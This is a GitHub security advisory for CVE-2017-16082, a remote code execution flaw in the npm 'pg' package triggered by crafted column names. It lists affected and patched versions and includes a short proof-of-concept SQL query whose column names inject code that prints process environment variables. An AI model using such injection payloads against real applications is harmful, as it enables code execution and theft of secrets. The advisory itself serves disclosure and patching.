# [C] Remote Code Execution in pg

## Summary
Severity: Critical
Advisory: GHSA-wc9v-mj63-m9g5
CVE: CVE-2017-16082
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2018-07-24
Source: https://github.com/advisories/GHSA-wc9v-mj63-m9g5
Type: github-advisory

## Affected
- npm: `pg` — affected >=0 <2.11.2
- npm: `pg` — affected >=3.0.0 <3.6.4
- npm: `pg` — affected >=4.0.0 <4.5.7
- npm: `pg` — affected >=5.0.0 <5.2.1
- npm: `pg` — affected >=6.0.0 <6.0.5
- npm: `pg` — affected >=6.1.0 <6.1.6
- npm: `pg` — affected >=6.2.0 <6.2.5
- npm: `pg` — affected >=6.3.0 <6.3.3
- npm: `pg` — affected >=6.4.0 <6.4.2
- npm: `pg` — affected >=7.0.0 <7.0.2
- npm: `pg` — affected >=7.1.0 <7.1.2

## Details
Affected versions of `pg` contain a remote code execution vulnerability that occurs when the remote database or query specifies a crafted column name. 

There are two specific scenarios in which it is likely for an application to be vulnerable:
1. The application executes unsafe, user-supplied sql which contains malicious column names.
2. The application connects to an untrusted database and executes a query returning results which contain a malicious column name.

## Proof of Concept
```
const { Client } = require('pg')
const client = new Client()
client.connect()

const sql = `SELECT 1 AS "\\'/*", 2 AS "\\'*/\n + console.log(process.env)] = null;\n//"`

client.query(sql, (err, res) => {
  client.end()
})
```


## Recommendation

* Version 2.x.x: Update to version 2.11.2 or later.
* Version 3.x.x: Update to version 3.6.4 or later.
* Version 4.x.x: Update to version 4.5.7 or later.
* Version 5.x.x: Update to version 5.2.1 or later.
* Version 6.x.x: Update to version 6.4.2 or later. ( Note that versions 6.1.6, 6.2.5, and 6.3.3 are also patched. )
* Version 7.x.x: Update to version 7.1.2 or later. ( Note that version 7.0.2 is also patched. )

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16082
- https://github.com/advisories/GHSA-wc9v-mj63-m9g5
- https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability
- https://www.npmjs.com/advisories/521
